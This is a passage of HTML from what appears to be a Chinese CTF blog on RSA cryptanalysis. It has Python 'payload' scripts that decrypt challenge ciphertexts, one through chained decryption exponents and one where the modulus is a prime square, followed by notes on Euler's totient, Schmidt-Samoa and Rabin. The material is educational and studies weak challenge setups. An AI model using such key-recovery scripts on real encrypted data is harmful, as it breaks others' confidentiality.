class="token number">20304610279578186738172766224224793119885071262464464448863461184092225736054747976985179673905441502689126216282897704508745403799054734121583968853999791604281615154100736259131453424385364324630229671185343778172807262640709301838274824603101692485662726226902121105591137437331463201881264245562214012160875177167442010952439360623396658974413900469093836794752270399520074596329058725874834082188697377597949405779039139194196065364426213208345461407030771089787529200057105746584493554722790592530472869581310117300343461207750821737840042745530876391793484035024644475535353227851321505537398888106855012746117</span></pre></td></tr><tr><td data-num="6"></td><td><pre>p<span class="token operator">=</span><span class="token number">134460556242811604004061671529264401215233974442536870999694816691450423689575549530215841622090861571494882591368883283016107051686642467260643894947947473532769025695530343815260424314855023688439603651834585971233941772580950216838838690315383700689885536546289584980534945897919914730948196240662991266027</span></pre></td></tr><tr><td data-num="7"></td><td><pre>q<span class="token operator">=</span><span class="token number">161469718942256895682124261315253003309512855995894840701317251772156087404025170146631429756064534716206164807382734456438092732743677793224010769460318383691408352089793973150914149255603969984103815563896440419666191368964699279209687091969164697704779792586727943470780308857107052647197945528236341228473</span></pre></td></tr><tr><td data-num="8"></td><td><pre>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">103231</span><span class="token punctuation">,</span><span class="token number">97117</span><span class="token punctuation">,</span><span class="token number">69557</span><span class="token punctuation">,</span><span class="token number">108533</span><span class="token punctuation">,</span><span class="token number">106979</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>d<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    d<span class="token punctuation">.</span>append<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>i<span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>m<span class="token operator">=</span>c</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> d<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    m<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>m<span class="token punctuation">,</span>i<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="欧拉函数运用"><a class="anchor" href="#欧拉函数运用">#</a> 欧拉函数运用</h2>
<p>output:</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>npre></td></tr><tr><td data-num="2"></td><td><pre>e=65537</pre></td></tr><tr><td data-num="3"></td><td><pre>cpre></td></tr></table></figure><p>可以分解 n；</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>n</mi><mo>=</mo><msup><mi>p</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n=p^2
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>那么欧拉定理中当</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>n</mi><mo>=</mo><msup><mi>p</mi><mn>2</mn></msup><mspace linebreak="newline"></mspace><mtext>则</mtext><mi>p</mi><mi>h</mi><mi>i</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>p</mi><mi>k</mi></msup><mo>−</mo><msup><mi>p</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">n=p^2\\则phi(n)=p^k-p^{k-1}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>payload：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2s</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> math</pre></td></tr><tr><td data-num="5"></td><td><pre>n<span class="token operator">=</span><span class="token number">535860808044009550029177135708168016201451343147313565371014459027743491739422885443084705720731409713775527993719682583669164873806842043288439828071789970694759080842162253955259590552283047728782812946845160334801782088068154453021936721710269050985805054692096738777321796153384024897615594493453068138341203673749514094546000253631902991617197847584519694152122765406982133526594928685232381934742152195861380221224370858128736975959176861651044370378539093990198336298572944512738570839396588590096813217791191895941380464803377602779240663133834952329316862399581950590588006371221334128215409197603236942597674756728212232134056562716399155080108881105952768189193728827484667349378091100068224404684701674782399200373192433062767622841264055426035349769018117299620554803902490432339600566432246795818167460916180647394169157647245603555692735630862148715428791242764799469896924753470539857080767170052783918273180304835318388177089674231640910337743789750979216202573226794240332797892868276309400253925932223895530714169648116569013581643192341931800785254715083294526325980247219218364118877864892068185905587410977152737936310734712276956663192182487672474651103240004173381041237906849437490609652395748868434296753449</span></pre></td></tr><tr><td data-num="6"></td><td><pre>p<span class="token operator">=</span><span class="token number">23148667521998097720857168827790771337662483716348435477360567409355026169165934446949809664595523770853897203103759106983985113264049057416908191166720008503275951625738975666019029172377653170602440373579593292576530667773951407647222757756437867216095193174201323278896027294517792607881861855264600525772460745259440301156930943255240915685718552334192230264780355799179037816026330705422484000086542362084006958158550346395941862383925942033730030004606360308379776255436206440529441711859246811586652746028418496020145441513037535475380962562108920699929022900677901988508936509354385660735694568216631382653107</span></pre></td></tr><tr><td data-num="7"></td><td><pre>phi<span class="token operator">=</span>p<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span>p</pre></td></tr><tr><td data-num="8"></td><td><pre>e<span class="token operator">=</span><span class="token number">65537</span></pre></td></tr><tr><td data-num="9"></td><td><pre>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>c<span class="token operator">=</span><span class="token number">222502885974182429500948389840563415291534726891354573907329512556439632810921927905220486727807436668035929302442754225952786602492250448020341217733646472982286222338860566076161977786095675944552232391481278782019346283900959677167026636830252067048759720251671811058647569724495547940966885025629807079171218371644528053562232396674283745310132242492367274184667845174514466834132589971388067076980563188513333661165819462428837210575342101036356974189393390097403614434491507672459254969638032776897417674577487775755539964915035731988499983726435005007850876000232292458554577437739427313453671492956668188219600633325930981748162455965093222648173134777571527681591366164711307355510889316052064146089646772869610726671696699221157985834325663661400034831442431209123478778078255846830522226390964119818784903330200488705212765569163495571851459355520398928214206285080883954881888668509262455490889283862560453598662919522224935145694435885396500780651530829377030371611921181207362217397805303962112100190783763061909945889717878397740711340114311597934724670601992737526668932871436226135393872881664511222789565256059138002651403875484920711316522536260604255269532161594824301047729082877262812899724246757871448545439896</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">#print (n2s (int (gmpy2.iroot (c,e)[0])).decode (),end="") #c 开 e 次根 m=pow (c,d,n) d=invert (e,(p-1)*(q-1))</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="欧拉函数"><a class="anchor" href="#欧拉函数">#</a> 欧拉函数</h3>
<p>如何计算欧拉函数<br />
通式：</p>
<h4 id="积性函数"><a class="anchor" href="#积性函数">#</a> 积性函数</h4>
<p>若当 m 与 n 互质时，f (m∗n) = f (m)∗f (n) ，那么 f 是积性函数。</p>
<p>若对任意正整数，都有 f (m*n)=f (m)*f (n) 成立，则 f 是完全积性函数。</p>
<h4 id="欧拉函数的几个性质"><a class="anchor" href="#欧拉函数的几个性质">#</a> 欧拉函数的几个性质</h4>
<ol>
<li>
<p>对于质数 p，phi (p)=p-1</p>
</li>
<li>
<p>p 为质数，</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>n</mi><mo>=</mo><msup><mi>p</mi><mi>k</mi></msup></mrow><annotation encoding="application/x-tex">n=p^k
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mi>h</mi><mi>i</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>p</mi><mi>k</mi></msup><mo>−</mo><msup><mi>p</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">phi(n)=p^k - p^{k-1}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>欧拉函数是积性函数，但不是完全积性函数。若 m,n 互质，则</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mtext>∗</mtext><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mtext>∗</mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">φ ( m ∗ n ) = φ ( m ) ∗ φ ( n )
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord">∗</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mord">∗</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p>
<p>特殊的，当 m=2，n 为奇数时，</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mn>2</mn><mo>∗</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">φ(2*n)=φ(n)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p>
<ol start="3">
<li>当 n&gt;2 时，φ(n) 是偶数</li>
</ol>
</li>
</ol>
<h2 id="schmidt-samoa-密码体系"><a class="anchor" href="#schmidt-samoa-密码体系">#</a> Schmidt-Samoa 密码体系</h2>
<p><em>与 Rabin 类似，它的安全性基于大整数分解的困难性。但 Rabin 解密时会得到四个解，而 Schmidt-Samor 得到的是唯一解。</em></p>
<h3 id="稍微带一下rabin"><a class="anchor" href="#稍微带一下rabin">#</a> 稍微带一下 Rabin</h3>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mn>2</mn></msup><mo>≡</mo><mi>c</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mi>N</mi><mo>⟺</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>m</mi><mn>2</mn></msup><mo>≡</mo><mi>c</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mspace width="1em"/><mi>A</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>m</mi><mn>2</mn></msup><mo>≡</mo><mi>c</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>q</mi><mspace width="1em"/><mi>B</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">m^2\equiv cmodnN \Longleftrightarrow\begin{cases} m^2\equiv cmodp\quad A \\ m^2\equiv cmodq \quad B\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.71844em;vertical-align:-0.024em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟺</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">A</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>运用 Legendre 符号</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mfrac><mi>c</mi><mi>p</mi></mfrac><mo stretchy="false">)</mo><mo>=</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup></mrow><annotation encoding="application/x-tex">(\frac cp)=c^{\frac {p-1}2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.9880000000000002em;vertical-align:-0.8804400000000001em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">p</span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">c</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mo>≡</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">c^{\frac {p-1}2} \equiv 1 mod p
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span></span></span></span></p>
<p>代入 A 式</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mn>2</mn></msup><mo>≡</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">m^2\equiv c^{\frac {p+1}2}modp
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2533299999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing 